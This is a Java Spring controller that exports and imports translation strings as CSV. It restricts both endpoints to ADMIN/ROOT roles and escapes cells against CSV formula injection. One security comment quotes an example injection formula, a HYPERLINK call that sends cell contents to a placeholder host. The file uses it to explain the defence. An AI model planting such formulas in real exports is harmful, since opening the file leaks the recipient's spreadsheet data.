/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/. */
package ch.plaintext.i18n.web;

import ch.plaintext.boot.utils.I18nSeedLinter;
import ch.plaintext.i18n.entity.I18nTranslation;
import ch.plaintext.i18n.service.I18nService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

/**
 * REST controller for exporting and importing i18n translations as CSV.
 * <p>
 * CSV format: defaultLabel;languageCode;translatedText
 * (semicolon-separated to avoid conflicts with commas in text)
 * <p>
 * Endpoints:
 * <ul>
 *   <li>GET /api/i18n/export - export all translations</li>
 *   <li>GET /api/i18n/export?lang=en - export translations for a specific language</li>
 *   <li>GET /api/i18n/export?untranslated=true - export only untranslated (X_) entries</li>
 *   <li>POST /api/i18n/import - import translations from CSV upload</li>
 * </ul>
 *
 * <p><b>SECURITY (card 304):</b> both endpoints are meant exclusively for ADMIN/ROOT.
 * Translations are <em>global</em> (the entity {@code I18nTranslation} has no
 * {@code mandat} column) and end up on admin pages such as {@code useradmin.xhtml} — any
 * {@code ROLE_USER} was previously allowed to overwrite them (stored XSS in the admin context)
 * or to export them in full.
 * <p>The primary safeguard is the path matcher
 * {@code /api/i18n/** -> hasAnyRole("ADMIN","ROOT")} in {@code PlaintextSecurityConfig}. The
 * check here is the second line of defence, for the case that a consuming application loses the
 * filter chain rule (e.g. through an overly broad {@code permitAllPatterns}).
 * {@code @PreAuthorize} is deliberately NOT used: {@code @EnableMethodSecurity} is not active
 * anywhere in the framework, so the annotation would be a silent dummy.
 */
@RestController
@RequestMapping("/api/i18n")
@Slf4j
public class I18nExportController {

    private static final String CSV_SEPARATOR = ";";
    private static final String CSV_HEADER = "defaultLabel;languageCode;translatedText";

    /** Roles allowed to read/write translations (authorities are {@code ROLE_<UPPERCASE>}). */
    private static final Set<String> ERLAUBTE_AUTHORITIES = Set.of("ROLE_ADMIN", "ROLE_ROOT");

    private final I18nService i18nService;

    public I18nExportController(I18nService i18nService) {
        this.i18nService = i18nService;
    }

    /**
     * Second line of defence: checks the role programmatically against the SecurityContext.
     *
     * @return true when the current principal is ADMIN or ROOT
     */
    private boolean istBerechtigt() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth == null || !auth.isAuthenticated()) {
            return false;
        }
        // AnonymousAuthenticationToken is "authenticated" but carries only ROLE_ANONYMOUS
        // and therefore fails the authority check.
        return auth.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .anyMatch(ERLAUBTE_AUTHORITIES::contains);
    }

    /** Logs the rejection and returns 403. */
    private <T> ResponseEntity<T> verweigert(String endpunkt) {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        log.warn("SECURITY: Zugriff auf {} ohne ADMIN/ROOT-Rolle abgelehnt (user={})",
                endpunkt, auth == null ? "anonym" : auth.getName());
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }

    /**
     * Export translations as CSV file.
     *
     * @param lang optional language filter (e.g., "en", "fr")
     * @param untranslated if true, only export entries with X_ prefix
     * @return CSV file download
     */
    @GetMapping("/export")
    public ResponseEntity<byte[]> exportCsv(
            @RequestParam(required = false) String lang,
            @RequestParam(required = false, defaultValue = "false") boolean untranslated) {

        if (!istBerechtigt()) {
            return verweigert("GET /api/i18n/export");
        }

        List<I18nTranslation> translations;

        if (untranslated) {
            translations = (lang != null && !lang.isBlank())
                    ? i18nService.getUntranslatedEntries(lang)
                    : i18nService.getUntranslatedEntries();
        } else {
            translations = (lang != null && !lang.isBlank())
                    ? i18nService.getTranslationsByLanguage(lang)
                    : i18nService.getAllTranslations();
        }

        StringBuilder csv = new StringBuilder();
        csv.append(CSV_HEADER).append("\n");

        for (I18nTranslation t : translations) {
            csv.append(escapeCsv(t.getDefaultLabel()))
               .append(CSV_SEPARATOR)
               .append(escapeCsv(t.getLanguageCode()))
               .append(CSV_SEPARATOR)
               .append(escapeCsv(t.getTranslatedText()))
               .append("\n");
        }

        byte[] content = csv.toString().getBytes(StandardCharsets.UTF_8);

        String filename = "i18n-translations";
        if (lang != null && !lang.isBlank()) {
            filename += "-" + lang;
        }
        if (untranslated) {
            filename += "-untranslated";
        }
        filename += ".csv";

        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + filename + "\"")
                .contentType(MediaType.parseMediaType("text/csv; charset=UTF-8"))
                .contentLength(content.length)
                .body(content);
    }

    /**
     * Import translations from a CSV file upload.
     * <p>
     * Expected CSV format (semicolon-separated):
     * defaultLabel;languageCode;translatedText
     * <p>
     * Lines starting with "#" are treated as comments and skipped.
     * The first line is skipped if it matches the header.
     *
     * @param file the CSV file to import
     * @return summary of import results
     */
    @PostMapping("/import")
    public ResponseEntity<ImportResult> importCsv(@RequestParam("file") MultipartFile file) {
        if (!istBerechtigt()) {
            return verweigert("POST /api/i18n/import");
        }
        if (file.isEmpty()) {
            return ResponseEntity.badRequest()
                    .body(new ImportResult(0, 0, List.of("File is empty")));
        }

        int imported = 0;
        int skipped = 0;
        List<String> errors = new ArrayList<>();

        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(file.getInputStream(), StandardCharsets.UTF_8))) {

            String line;
            int lineNumber = 0;

            while ((line = reader.readLine()) != null) {
                lineNumber++;

                // Skip empty lines and comments
                if (line.isBlank() || line.startsWith("#")) {
                    continue;
                }

                // Skip header line
                if (lineNumber == 1 && line.startsWith("defaultLabel")) {
                    continue;
                }

                String[] parts = line.split(CSV_SEPARATOR, 3);
                if (parts.length < 3) {
                    errors.add("Line " + lineNumber + ": expected 3 columns, got " + parts.length);
                    skipped++;
                    continue;
                }

                String defaultLabel = unescapeCsv(parts[0].trim());
                String languageCode = unescapeCsv(parts[1].trim());
                String translatedText = unescapeCsv(parts[2].trim());

                if (defaultLabel.isEmpty() || languageCode.isEmpty()) {
                    errors.add("Line " + lineNumber + ": defaultLabel and languageCode must not be empty");
                    skipped++;
                    continue;
                }

                try {
                    i18nService.saveTranslation(defaultLabel, languageCode, translatedText);
                    imported++;
                } catch (Exception e) {
                    errors.add("Line " + lineNumber + ": " + e.getMessage());
                    skipped++;
                }
            }

        } catch (Exception e) {
            log.error("Error importing CSV", e);
            return ResponseEntity.internalServerError()
                    .body(new ImportResult(imported, skipped, List.of("Error reading file: " + e.getMessage())));
        }

        log.info("CSV import completed: {} imported, {} skipped, {} errors", imported, skipped, errors.size());
        return ResponseEntity.ok(new ImportResult(imported, skipped, errors));
    }

    /**
     * SECURITY (card 314, item 15): characters that make Excel/LibreOffice/Google Sheets interpret
     * a cell as a FORMULA. A translation text such as
     * {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")} reaches the recipient's
     * spreadsheet through the export and is executed there when it is opened (CSV/formula injection).
     */
    private static final String CSV_FORMULA_TRIGGERS = "=+-@\t\r";

    /**
     * Escape a value for CSV output. Wraps in quotes if it contains the separator, quotes, or newlines.
     *
     * <p>SECURITY (card 314, item 15): leading formula triggers are additionally neutralised with a
     * single quote. This is the variant recommended by OWASP: the
     * value stays readable in the spreadsheet but is guaranteed to be treated as text. The re-import
     * through {@link #unescapeCsv(String)} removes the character again, so that export -> import
     * stays lossless.
     */
    private String escapeCsv(String value) {
        if (value == null) {
            return "";
        }
        String safe = value;
        if (!safe.isEmpty() && CSV_FORMULA_TRIGGERS.indexOf(safe.charAt(0)) >= 0) {
            safe = "'" + safe;
        }
        if (safe.contains(CSV_SEPARATOR) || safe.contains("\"") || safe.contains("\n")) {
            return "\"" + safe.replace("\"", "\"\"") + "\"";
        }
        return safe;
    }

    /**
     * Unescape a CSV value (remove surrounding quotes, unescape doubled quotes).
     *
     * <p>SECURITY (card 314, item 15): additionally removes the protective apostrophe that the export
     * prepends, so that an export -> import cycle restores the original text
     * instead of growing another apostrophe on every pass.
     */
    private String unescapeCsv(String value) {
        // The seed importer reads by the same rule (wave 2, 29.08.2026): an export can be checked in
        // unchanged as src/main/resources/i18n/*.csv.
        return I18nSeedLinter.unescape(value);
    }

    /**
     * Result DTO for CSV import.
     */
    public record ImportResult(int imported, int skipped, List<String> errors) {
    }
}
